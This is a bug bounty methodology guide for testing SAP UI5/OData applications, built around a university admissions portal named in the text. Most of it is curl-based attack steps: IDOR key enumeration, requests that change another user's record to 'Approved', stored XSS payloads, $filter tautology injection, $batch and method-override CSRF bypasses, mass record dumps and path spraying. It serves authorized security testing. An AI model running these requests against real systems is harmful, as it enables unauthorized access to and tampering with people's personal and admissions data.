# SAP OData API Security Testing Methodology

A practical guide for bug bounty hunters targeting SAP UI5 + OData applications.
Based on real-world engagement patterns observed testing KU Leuven's SAP-based admissions portal.

---

## Table of Contents

1. [OData Fundamentals for Bug Bounty](#1-odata-fundamentals-for-bug-bounty)
2. [Reconnaissance](#2-reconnaissance)
3. [IDOR Testing on OData](#3-idor-testing-on-odata)
4. [XSS in OData Write Operations](#4-xss-in-odata-write-operations)
5. [CSRF Token Handling](#5-csrf-token-handling)
6. [OData Injection](#6-odata-injection)
7. [$batch Testing](#7-batch-testing)
8. [Function Import Testing](#8-function-import-testing)
9. [SAP-Specific Patterns](#9-sap-specific-patterns)
10. [UI5 Frontend Analysis](#10-ui5-frontend-analysis)
11. [Common SAP Paths](#11-common-sap-paths)

---

## 1. OData Fundamentals for Bug Bounty

### What OData Is

OData (Open Data Protocol) is a REST-based protocol SAP uses to expose backend data from ABAP systems, S/4HANA, and BTP. Every SAP Fiori / UI5 app talks to the backend through OData services. For a hunter, this means every UI5 app has a structured, predictable API surface you can map and test directly.

### OData v2 vs v4 (What Matters for Testing)

| Aspect | OData v2 | OData v4 |
|---|---|---|
| **Default format** | XML (Atom/AtomPub) | JSON |
| **Base path** | `/sap/opu/odata/sap/` | `/sap/opu/odata4/sap/` |
| **Update verb** | `MERGE` (partial update) | `PATCH` |
| **Batch endpoint** | `/$batch` (multipart MIME) | `/$batch` (JSON) |
| **Filter syntax** | `$filter=Field eq 'value'` | Same, plus `$apply`, lambda operators |
| **Bound actions** | Not supported | Supported |
| **Prevalence** | Majority of SAP on-prem apps | Newer S/4HANA Cloud, BTP apps |

Most SAP on-premise targets (including university portals like KU Leuven) run OData v2. Always check the $metadata namespace to confirm.

### How SAP Exposes Services

SAP developers create OData services in the backend (via SEGW transaction or RAP for v4). These are registered and made accessible under predictable URL patterns:

```
https://target.com/sap/opu/odata/sap/ZSERVICE_NAME_SRV/
```

The `Z` prefix indicates a custom (customer-developed) service. Standard SAP services omit the Z prefix.

---

## 2. Reconnaissance

### Step 1: Discover OData Service Root

Intercept traffic while using the application. Look for requests to `/sap/opu/odata/`. The service root URL reveals the service name.

```bash
# Once you have a service URL, hit the service root
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/" \
  -H "Accept: application/json"
```

This returns a service document listing all entity sets (collections) the service exposes.

### Step 2: Fetch $metadata

The $metadata document is the single most valuable artifact. It defines every entity type, property, association, navigation property, and function import.

```bash
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/$metadata" \
  -o metadata.xml
```

### Step 3: Parse the Entity Model

From $metadata, extract:

- **EntityType** blocks: Define the data model (field names, types, whether they are key fields).
- **EntitySet** blocks: Map entity types to URL-addressable collections.
- **NavigationProperty**: Relationships between entities (expand targets).
- **FunctionImport**: Custom operations beyond CRUD.
- **sap:creatable / sap:updatable / sap:deletable** annotations: Tell you which operations are allowed per entity set.
- **sap:filterable / sap:sortable**: Tell you which fields accept $filter and $orderby.

```bash
# Quick extraction of entity sets and function imports
grep -E "EntitySet |FunctionImport " metadata.xml
```

**Checklist:**
- [ ] Service root document retrieved
- [ ] $metadata downloaded and saved
- [ ] All EntitySets listed
- [ ] All FunctionImports listed
- [ ] Writable vs read-only fields noted (sap:updatable)
- [ ] Key fields and their types noted (Edm.String, Edm.Int32, Edm.Guid)

---

## 3. IDOR Testing on OData

OData entities are addressed by key. This is the primary IDOR surface.

### Entity Key Manipulation

OData uses a canonical key syntax:

```
/EntitySet('key_value')              -- single string key
/EntitySet(123)                      -- single integer key
/EntitySet(Key1='val1',Key2='val2')  -- composite key
```

Test by substituting another user's key value:

```bash
# Your own record
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')" \
  -H "Accept: application/json"

# Another user's record -- IDOR test
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012346')" \
  -H "Accept: application/json"
```

### Sequential ID Enumeration

If keys are sequential integers or zero-padded numbers, enumerate:

```bash
for i in $(seq 12340 12360); do
  id=$(printf "%08d" $i)
  status=$(curl -s -o /dev/null -w "%{http_code}" -b cookies.txt \
    "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('$id')" \
    -H "Accept: application/json")
  echo "$id -> $status"
done
```

Look for 200 responses that return data belonging to other users.

### SAP's Key-Override Pattern (Critical to Understand)

Many SAP OData implementations use a deceptive authorization pattern: **the backend ignores the key you supply in the URL and always returns the current authenticated user's data.** This means:

- You request `ApplicationSet('SOMEONE_ELSE_ID')` but get back YOUR data.
- The HTTP response is 200 with valid JSON -- it looks like the request succeeded.
- But the `d.ApplicationId` in the response body matches YOUR ID, not the one you requested.

**How to detect this:**

```bash
# Request a different user's ID
response=$(curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('99999999')" \
  -H "Accept: application/json")

# Check if the returned key matches what you requested
echo "$response" | python3 -c "
import json, sys
d = json.load(sys.stdin)['d']
print(f\"Requested: 99999999\")
print(f\"Returned:  {d.get('ApplicationId', 'N/A')}\")
"
```

If the returned ID does not match the requested ID, the backend is overriding the key. This is NOT an IDOR -- it is SAP's implicit authorization. Do not report this as a vulnerability.

**Always compare the requested key with the key in the response body.** This is the most common false positive in SAP OData IDOR testing.

### Navigation Property IDOR

Even when the main entity is protected, navigation properties might leak:

```bash
# Access documents attached to another user's application
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012346')/Documents" \
  -H "Accept: application/json"
```

### IDOR on Write Operations

Test whether you can modify another user's entity:

```bash
# First fetch a CSRF token (see Section 5)
TOKEN=$(curl -s -b cookies.txt -c cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/" \
  -H "x-csrf-token: fetch" -D - 2>/dev/null | grep -i x-csrf-token | awk '{print $2}' | tr -d '\r')

# Attempt to MERGE (update) another user's record
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012346')" \
  -X MERGE \
  -H "Content-Type: application/json" \
  -H "x-csrf-token: $TOKEN" \
  -d '{"Status": "Approved"}'
```

**Checklist:**
- [ ] Test GET with another user's entity key
- [ ] Verify response body key matches requested key (detect key-override)
- [ ] Test navigation properties for horizontal access
- [ ] Test MERGE/PUT/DELETE with another user's key
- [ ] Test $filter to enumerate (e.g., `$filter=Email eq 'victim@example.com'`)

---

## 4. XSS in OData Write Operations

### Finding Writable Free-Text Fields

From $metadata, identify fields that are:
1. Type `Edm.String`
2. Annotated `sap:updatable="true"` (or not annotated as non-updatable)
3. Semantically free-text (comments, notes, descriptions, motivation letters)

### MERGE/PUT Injection in Free-Text Fields

```bash
# Inject XSS payload via MERGE (OData v2 partial update)
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')" \
  -X MERGE \
  -H "Content-Type: application/json" \
  -H "x-csrf-token: $TOKEN" \
  -d '{"MotivationText": "<script>alert(document.domain)</script>"}'

# Verify it was stored
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')" \
  -H "Accept: application/json" | python3 -m json.tool
```

### The "Stored But Frontend-Escaped" Pattern

SAP OData backends typically store the raw payload without sanitization. The critical question is whether the frontend renders it unsafely.

**SAP UI5 rendering behavior:**

| UI5 Control | HTML Rendered? | XSS Risk |
|---|---|---|
| `sap.m.Text` | No (auto-escaped) | None |
| `sap.m.TextArea` | No (value attribute) | None |
| `sap.m.FormattedText` | Yes (subset of HTML) | Medium -- allows `<a>`, `<b>`, `<em>`, but blocks `<script>` |
| `sap.ui.core.HTML` | Yes (raw) | High |
| `sap.ui.richtexteditor.RichTextEditor` | Yes | High |

**Key insight:** In the KU Leuven engagement pattern, the backend stores `<script>alert(1)</script>` verbatim in the OData entity, but when the UI5 frontend reads it back, `sap.m.Text` and `sap.m.TextArea` controls HTML-encode the output. The payload is stored but never executes.

**To confirm real XSS:**
1. Store the payload via MERGE/PUT.
2. Read it back via GET to confirm storage.
3. Load the page in a browser and inspect the DOM -- is it rendered as HTML or escaped as text?
4. Check if any admin/reviewer panel renders the field with `FormattedText` or raw HTML.

**Escalation vectors:**
- Does an admin dashboard render these fields with a different (less safe) control?
- Is the data exported to PDF/Excel where it might be interpreted differently?
- Is there an email notification that includes the field value in HTML body?

```bash
# Payloads to test various contexts
# Standard
'{"Notes": "<img src=x onerror=alert(1)>"}'

# For FormattedText (which allows certain tags)
'{"Notes": "<a href=\"javascript:alert(1)\">click</a>"}'

# Event handler on allowed tags
'{"Notes": "<b onmouseover=alert(1)>hover me</b>"}'
```

**Checklist:**
- [ ] Identify all Edm.String writable fields from $metadata
- [ ] Inject XSS payloads via MERGE/PUT
- [ ] Confirm payload is stored (GET and check response body)
- [ ] Check browser rendering (DOM inspection) for actual execution
- [ ] Identify which UI5 control renders the field (Text vs FormattedText vs HTML)
- [ ] Check secondary rendering contexts (admin views, emails, exports)

---

## 5. CSRF Token Handling

### x-csrf-token: fetch Pattern

SAP OData requires a CSRF token for all state-changing requests (POST, PUT, MERGE, DELETE). The flow:

```bash
# Step 1: Fetch token -- any GET to the service with this header
TOKEN=$(curl -s -b cookies.txt -c cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/" \
  -H "x-csrf-token: fetch" \
  -D /dev/stderr 2>&1 1>/dev/null | grep -i "x-csrf-token:" | awk '{print $2}' | tr -d '\r')

echo "Token: $TOKEN"

# Step 2: Use token in write request
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')" \
  -X MERGE \
  -H "Content-Type: application/json" \
  -H "x-csrf-token: $TOKEN" \
  -d '{"Field": "value"}'
```

### Testing CSRF Enforcement

```bash
# Test 1: Omit the token entirely
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')" \
  -X MERGE \
  -H "Content-Type: application/json" \
  -d '{"Field": "value"}'
# Expected: 403 with "CSRF token validation failed"

# Test 2: Use an invalid/expired token
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')" \
  -X MERGE \
  -H "Content-Type: application/json" \
  -H "x-csrf-token: AAAAAAAAAAAAAAAAAAAAAA==" \
  -d '{"Field": "value"}'
# Expected: 403

# Test 3: Use a token from a different session/user
# (fetch token with user A's cookies, send with user B's cookies)
```

### X-HTTP-Method-Override Bypass Attempts

Some SAP systems support method tunneling via POST. This can sometimes bypass CSRF checks that only apply to specific HTTP methods:

```bash
# Attempt method override -- send a POST but override to MERGE
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')" \
  -X POST \
  -H "X-HTTP-Method-Override: MERGE" \
  -H "Content-Type: application/json" \
  -d '{"Field": "value"}'

# Some systems also accept X-HTTP-Method or X-Method-Override
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')" \
  -X POST \
  -H "X-HTTP-Method: DELETE" \
  -H "Content-Type: application/json"
```

**Checklist:**
- [ ] Confirm CSRF token is required (403 without it)
- [ ] Test expired/invalid tokens
- [ ] Test cross-session token reuse
- [ ] Test X-HTTP-Method-Override bypass
- [ ] Check if token is bound to session or freely reusable

---

## 6. OData Injection

OData query options are parsed by the backend. Malformed or crafted values can cause errors, information disclosure, or logic bypass.

### $filter Injection

```bash
# Normal filter
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet?\$filter=Status%20eq%20'Active'" \
  -H "Accept: application/json"

# Boolean tautology -- attempt to bypass filter-based authorization
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet?\$filter=Status%20eq%20'Active'%20or%201%20eq%201" \
  -H "Accept: application/json"

# Nested function injection
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet?\$filter=substringof('admin',Email)" \
  -H "Accept: application/json"

# String termination attempt
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet?\$filter=Name%20eq%20'test''%20or%20''1''eq''1'" \
  -H "Accept: application/json"
```

### $expand Injection

$expand follows navigation properties. Test for unauthorized data access via deep expansion:

```bash
# Normal expand
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')?\$expand=Documents" \
  -H "Accept: application/json"

# Deep expand -- try to traverse to related entities
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')?\$expand=Documents,Payments,ReviewComments" \
  -H "Accept: application/json"

# Nested expand (v4 or some v2 implementations)
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')?\$expand=Documents/Owner" \
  -H "Accept: application/json"
```

### $orderby Injection

```bash
# Test for error-based information disclosure
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet?\$orderby=NonExistentField%20asc" \
  -H "Accept: application/json"
# Error messages may leak internal field names or backend details
```

### $select Injection

```bash
# Request fields not exposed in the default projection
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('00012345')?\$select=InternalScore,ReviewerNotes,Password" \
  -H "Accept: application/json"
```

### $top / $skip Enumeration

```bash
# Dump all records if no server-side limit
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet?\$top=9999" \
  -H "Accept: application/json"

# Paginate through all records
for skip in $(seq 0 100 1000); do
  curl -s -b cookies.txt \
    "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet?\$top=100&\$skip=$skip" \
    -H "Accept: application/json" | python3 -c "
import json, sys
data = json.load(sys.stdin)
results = data.get('d', {}).get('results', [])
print(f'Skip {$skip}: {len(results)} results')
"
done
```

**Checklist:**
- [ ] Test $filter with boolean tautology
- [ ] Test $filter string functions (substringof, startswith, endswith)
- [ ] Test $expand on all navigation properties from $metadata
- [ ] Test $select for hidden/internal fields
- [ ] Test $orderby with invalid fields (check error verbosity)
- [ ] Test $top=9999 for mass data exposure
- [ ] Test $inlinecount=allpages to get total record count

---

## 7. $batch Testing

OData $batch allows bundling multiple operations in a single HTTP request. This is a rich attack surface.

### Basic $batch Structure (v2)

```bash
# OData v2 batch uses multipart MIME format
TOKEN=$(curl -s -b cookies.txt -c cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/" \
  -H "x-csrf-token: fetch" \
  -D /dev/stderr 2>&1 1>/dev/null | grep -i "x-csrf-token:" | awk '{print $2}' | tr -d '\r')

curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/\$batch" \
  -X POST \
  -H "Content-Type: multipart/mixed; boundary=batch_001" \
  -H "x-csrf-token: $TOKEN" \
  --data-binary @- << 'BATCHEOF'
--batch_001
Content-Type: application/http
Content-Transfer-Encoding: binary

GET ApplicationSet('00012345')?$select=Status HTTP/1.1
Accept: application/json

--batch_001
Content-Type: application/http
Content-Transfer-Encoding: binary

GET DocumentSet?$filter=ApplicationId eq '00012345' HTTP/1.1
Accept: application/json

--batch_001--
BATCHEOF
```

### Authorization Bypass via $batch

Test whether batch requests bypass per-entity authorization:

```bash
# Include a request for another user's data inside a batch
# Some implementations only check authorization on the batch endpoint,
# not on individual operations within the batch
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/\$batch" \
  -X POST \
  -H "Content-Type: multipart/mixed; boundary=batch_001" \
  -H "x-csrf-token: $TOKEN" \
  --data-binary @- << 'BATCHEOF'
--batch_001
Content-Type: application/http
Content-Transfer-Encoding: binary

GET ApplicationSet('VICTIM_ID') HTTP/1.1
Accept: application/json

--batch_001--
BATCHEOF
```

### Changesets (Write Operations in $batch)

```bash
# Changesets allow atomic write operations
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/\$batch" \
  -X POST \
  -H "Content-Type: multipart/mixed; boundary=batch_001" \
  -H "x-csrf-token: $TOKEN" \
  --data-binary @- << 'BATCHEOF'
--batch_001
Content-Type: multipart/mixed; boundary=changeset_001

--changeset_001
Content-Type: application/http
Content-Transfer-Encoding: binary

MERGE ApplicationSet('00012345') HTTP/1.1
Content-Type: application/json
Accept: application/json

{"Status": "Approved"}

--changeset_001--
--batch_001--
BATCHEOF
```

### Request Smuggling via $batch

Test whether the batch parser handles conflicting Content-Length or malformed boundaries:

```bash
# Malformed boundary -- test parser robustness
# Double-encode or misalign boundaries to see if extra requests get processed
```

**Checklist:**
- [ ] Confirm $batch endpoint is accessible
- [ ] Test read operations for other users' entities inside batch
- [ ] Test changesets for unauthorized write operations
- [ ] Test mixing operations across different entity sets in one batch
- [ ] Compare authorization results: direct request vs same request in $batch

---

## 8. Function Import Testing

Function imports are custom operations beyond CRUD. They appear in $metadata under `<FunctionImport>` elements and are often high-value targets.

### Discovering Function Imports

```bash
# Extract from metadata
grep -A5 "FunctionImport" metadata.xml
```

Example metadata entry:
```xml
<FunctionImport Name="isPaymentDone" ReturnType="Edm.Boolean"
  m:HttpMethod="GET">
  <Parameter Name="ApplicationId" Type="Edm.String" Mode="In"/>
</FunctionImport>
```

### Calling Function Imports

```bash
# GET-based function import
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/isPaymentDone?ApplicationId='00012345'" \
  -H "Accept: application/json"

# Test with another user's ApplicationId -- IDOR on function imports
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/isPaymentDone?ApplicationId='00012346'" \
  -H "Accept: application/json"

# POST-based function import
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/SubmitApplication" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-csrf-token: $TOKEN" \
  -d '{"ApplicationId": "00012345"}'
```

### Common High-Value Function Imports to Look For

| Function Name Pattern | What It Might Do | Test For |
|---|---|---|
| `Submit*`, `Approve*`, `Reject*` | Workflow state changes | Unauthorized state transition |
| `is*Done`, `Check*`, `Validate*` | Status checks | IDOR (check another user's status) |
| `Get*Report`, `Export*` | Data export | Mass data exposure |
| `Delete*`, `Cancel*` | Destructive operations | Unauthorized deletion |
| `Assign*`, `Transfer*` | Ownership changes | Privilege escalation |
| `GetToken`, `GenerateLink` | Auth/access tokens | Token leakage |

### Parameter Tampering

```bash
# Test with empty parameters
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/isPaymentDone?ApplicationId=''" \
  -H "Accept: application/json"

# Test with wildcard/special characters
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/isPaymentDone?ApplicationId='*'" \
  -H "Accept: application/json"

# Test without required parameters
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/isPaymentDone" \
  -H "Accept: application/json"
```

**Checklist:**
- [ ] List all FunctionImports from $metadata
- [ ] Identify HTTP method for each (GET vs POST)
- [ ] Test each with valid parameters
- [ ] Test IDOR by substituting another user's identifiers
- [ ] Test with missing, empty, and wildcard parameters
- [ ] Test POST-based functions for CSRF enforcement

---

## 9. SAP-Specific Patterns

### Z-Services (Custom Development)

Services prefixed with `Z` or `Y` are custom-developed by the organization, not standard SAP. These are prime targets because:
- Less code review than standard SAP code
- Custom authorization logic (may be incomplete)
- Custom business logic (may have flaws)
- Less hardened than SAP standard services

```bash
# Enumerate Z-services via service catalog
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/IWFND/CATALOGSERVICE;v=2/ServiceCollection?\$filter=substringof('Z',TechnicalServiceName)" \
  -H "Accept: application/json"
```

### sap-client Parameter

SAP systems can host multiple clients (tenants) on the same instance. The `sap-client` parameter selects which client to connect to.

```bash
# Test different client numbers (000, 001, 100, 200, etc.)
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/?sap-client=000" \
  -H "Accept: application/json"

curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/?sap-client=001" \
  -H "Accept: application/json"

# Client 000 is the SAP reference client
# Client 001 is often a development/test client
# Client 066 is the SAP EarlyWatch client
```

If you get data from a different client, this is a significant finding (cross-client access).

### SAML2 Authentication

Many SAP systems use SAML2 for SSO (e.g., via Shibboleth, ADFS, Azure AD). The flow:

1. User hits SAP app
2. Redirect to IdP (e.g., university's Shibboleth)
3. IdP authenticates, posts SAML assertion back to SAP
4. SAP creates session, issues cookies

```bash
# Check for SAML2 endpoints
curl -s -D - "https://target.com/sap/saml2/sp/acs/100" 2>/dev/null | head -20
curl -s -D - "https://target.com/sap/saml2/metadata" 2>/dev/null | head -20
```

### SAP Session Cookies

Key cookies to understand:

| Cookie | Purpose | Notes |
|---|---|---|
| `MYSAPSSO2` | SSO ticket (base64-encoded signed assertion) | Can be decoded; may contain username, client, system ID |
| `SAP_SESSIONID_XXX_###` | Session identifier (XXX=SID, ###=client) | Tied to specific SAP system and client |
| `sap-usercontext` | Client and language info | Format: `sap-client=100; sap-language=EN` |
| `JSESSIONID` | Java-based SAP (e.g., SAP Portal, BTP) | Standard J2EE session |

```bash
# Decode MYSAPSSO2 ticket (base64)
echo "MYSAPSSO2_VALUE_HERE" | base64 -d | strings
# Look for: username, system ID, client number, issuer

# Check cookie attributes
curl -s -D - -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/" \
  2>/dev/null | grep -i "set-cookie"
# Check for: Secure flag, HttpOnly flag, SameSite attribute
```

### sap-language and Locale Manipulation

```bash
# Try different languages -- error messages may be more verbose in certain languages
curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('INVALID')/?sap-language=EN" \
  -H "Accept: application/json"

curl -s -b cookies.txt \
  "https://target.com/sap/opu/odata/sap/ZADMISSIONS_SRV/ApplicationSet('INVALID')/?sap-language=DE" \
  -H "Accept: application/json"
```

**Checklist:**
- [ ] Identify Z-services (custom) vs standard services
- [ ] Test sap-client parameter (000, 001, 100, 200, 300, 800)
- [ ] Examine and decode session cookies
- [ ] Check cookie security flags (Secure, HttpOnly, SameSite)
- [ ] Test sap-language for verbose error messages
- [ ] Check SAML2 metadata endpoint for configuration details

---

## 10. UI5 Frontend Analysis

SAP UI5 / Fiori apps are JavaScript SPAs. The frontend source code reveals backend service details, routes, and data binding.

### manifest.json (App Descriptor)

Every UI5 app has a `manifest.json` that declares OData data sources, routes, and models.

```bash
# Common locations
curl -s "https://target.com/sap/bc/ui5_ui5/sap/ZAPP_NAME/manifest.json"
curl -s "https://target.com/webapp/manifest.json"
curl -s "https://target.com/manifest.json"
```

Key sections to extract:

```json
{
  "sap.app": {
    "dataSources": {
      "mainService": {
        "uri": "/sap/opu/odata/sap/ZADMISSIONS_SRV/",
        "type": "OData",
        "settings": { "odataVersion": "2.0" }
      }
    }
  }
}
```

This gives you the exact OData service URI and version.

### Component-preload.js Analysis

UI5 apps are often bundled into a single `Component-preload.js` file. This contains all views, controllers, and configuration merged into one file.

```bash
# Download and search for sensitive patterns
curl -s "https://target.com/sap/bc/ui5_ui5/sap/ZAPP_NAME/Component-preload.js" -o preload.js

# Search for OData paths
grep -oP '/sap/opu/odata/[^\s"]+' preload.js | sort -u

# Search for entity set names
grep -oP '[A-Z][a-zA-Z]+Set' preload.js | sort -u

# Search for function import calls
grep -oP 'callFunction\([^)]+\)' preload.js

# Search for hardcoded credentials or API keys
grep -iP '(password|secret|api.?key|token|credential)' preload.js

# Search for hidden routes or debug modes
grep -iP '(debug|test|admin|internal|hidden)' preload.js
```

### FormattedText vs TextArea (XSS Implications)

When analyzing views in the preload for XSS potential:

```bash
# Find controls that render HTML
grep -P '(FormattedText|sap\.ui\.core\.HTML|RichTextEditor)' preload.js

# Find data binding on those controls
grep -B2 -A2 'FormattedText' preload.js
```

- `sap.m.FormattedText` renders a subset of HTML: `<a>`, `<b>`, `<em>`, `<strong>`, `<i>`, `<u>`, `<p>`, `<br>`, `<ul>`, `<ol>`, `<li>`, `<span>`, `<h1>`-`<h6>`. It strips `<script>`, event handlers, and `javascript:` URIs. However, CSS injection and phishing via `<a href>` may still work.
- `sap.m.Text` and `sap.m.TextArea` escape all HTML. No XSS possible through these controls.
- `sap.ui.core.HTML` renders arbitrary HTML -- direct XSS if user input flows in.

### Routing Configuration

```bash
# Extract routes from manifest.json
cat manifest.json | python3 -c "
import json, sys
m = json.load(sys.stdin)
routes = m.get('sap.ui5', {}).get('routing', {}).get('routes', [])
for r in routes:
    print(f\"  {r.get('pattern', 'N/A')} -> {r.get('target', 'N/A')}\")
"
```

Hidden or admin routes sometimes appear in the routing config but are not linked in the navigation.

**Checklist:**
- [ ] Download and analyze manifest.json
- [ ] Extract all dataSources (OData service URIs)
- [ ] Download Component-preload.js
- [ ] Search for entity sets, function imports, and OData paths
- [ ] Identify controls that render HTML (FormattedText, core.HTML)
- [ ] Check routing config for hidden/admin routes
- [ ] Search for hardcoded secrets or debug flags

---

## 11. Common SAP Paths

Use these paths during initial reconnaissance to fingerprint the SAP system and discover services.

### Information Disclosure

```bash
# SAP system information (often unauthenticated)
curl -s "https://target.com/sap/public/info"
# Returns: SAP system ID, kernel version, OS, database type

# ICF service listing (if accessible)
curl -s "https://target.com/sap/bc/http/sap"

# SAP login page (reveals system ID, client)
curl -s "https://target.com/sap/bc/gui/sap/its/webgui"
```

### OData Paths

```bash
# OData service root (most common)
/sap/opu/odata/sap/SERVICE_NAME_SRV/

# OData v4
/sap/opu/odata4/sap/SERVICE_NAME_SRV/

# Service catalog -- lists all registered OData services
/sap/opu/odata/IWFND/CATALOGSERVICE;v=2/ServiceCollection
/sap/opu/odata/IWFND/CATALOGSERVICE;v=2/ServiceCollection?$format=json

# Gateway metadata
/sap/opu/odata/IWFND/CATALOGSERVICE;v=2/$metadata
```

### WebDynpro and BSP Paths

```bash
# WebDynpro applications
/sap/bc/webdynpro/sap/APP_NAME

# BSP applications (older framework)
/sap/bc/bsp/sap/APP_NAME/

# Fiori Launchpad
/sap/bc/ui5_ui5/ui2/ushell/shells/abap/FioriLaunchpad.html
/sap/bc/ui2/flp
```

### UI5 Application Paths

```bash
# UI5 app resources
/sap/bc/ui5_ui5/sap/APP_NAME/
/sap/bc/ui5_ui5/sap/APP_NAME/manifest.json
/sap/bc/ui5_ui5/sap/APP_NAME/Component-preload.js
/sap/bc/ui5_ui5/sap/APP_NAME/i18n/i18n.properties

# UI5 resources (framework version disclosure)
/sap/public/bc/ui5_ui5/resources/sap-ui-core.js
/sap/public/bc/ui5_ui5/resources/sap-ui-version.json
```

### Authentication Endpoints

```bash
# SAML2
/sap/saml2/sp/acs/CLIENT_NUMBER
/sap/saml2/sp/metadata/CLIENT_NUMBER
/sap/saml2/idp/sso
/sap/saml2/sp/slo

# Basic auth challenge
/sap/opu/odata/sap/SERVICE_NAME_SRV/?sap-client=100

# Logon/logoff
/sap/public/bc/icf/logoff
/sap/bc/sec/oauth2/token
```

### Administrative and Diagnostic Paths (Often Restricted)

```bash
# Gateway error log (may be accessible to authenticated users)
/sap/opu/odata/IWFND/ERROR_LOG_SRV/ErrorLogCollection

# Message server (usually internal only)
/sap/public/icman/ping
/sap/public/ping

# SAP Web IDE (if exposed)
/sap/bc/adt/discovery

# Application log
/sap/opu/odata/sap/RSAU_LOG_DATA_SRV/
```

### Reconnaissance One-Liner

```bash
# Spray common paths against target
BASE="https://target.com"
paths=(
  "/sap/public/info"
  "/sap/opu/odata/IWFND/CATALOGSERVICE;v=2/ServiceCollection?\$format=json"
  "/sap/bc/ui2/flp"
  "/sap/saml2/sp/metadata/100"
  "/sap/public/bc/ui5_ui5/resources/sap-ui-version.json"
  "/sap/bc/webdynpro/sap/"
  "/sap/opu/odata/IWFND/ERROR_LOG_SRV/"
)

for path in "${paths[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -b cookies.txt "$BASE$path")
  echo "$status $path"
done
```

**Checklist:**
- [ ] Check /sap/public/info for system fingerprinting
- [ ] Query service catalog for full service list
- [ ] Check for accessible error log service
- [ ] Enumerate UI5 application paths
- [ ] Check SAML2 metadata endpoint
- [ ] Identify SAP UI5 framework version
- [ ] Test for accessible WebDynpro/BSP applications

---

## Quick Reference: Testing Workflow

```
1. RECON
   |-- Hit /sap/public/info
   |-- Query CATALOGSERVICE for service list
   |-- Intercept UI5 app traffic, note OData service URLs
   |-- Download manifest.json + Component-preload.js
   |-- Download $metadata for each service
   |
2. MAP
   |-- List all EntitySets, their keys, and writability
   |-- List all FunctionImports and parameters
   |-- List all NavigationProperties
   |-- Note key field types (string, int, GUID)
   |
3. TEST
   |-- IDOR: Swap entity keys (verify response body, not just HTTP 200)
   |-- IDOR: Test navigation properties
   |-- IDOR: Test FunctionImports with other users' parameters
   |-- XSS: MERGE payloads into writable string fields
   |-- XSS: Check browser rendering (DOM), not just stored value
   |-- $filter injection: tautology, string functions
   |-- $expand: all navigation properties
   |-- $select: request hidden fields
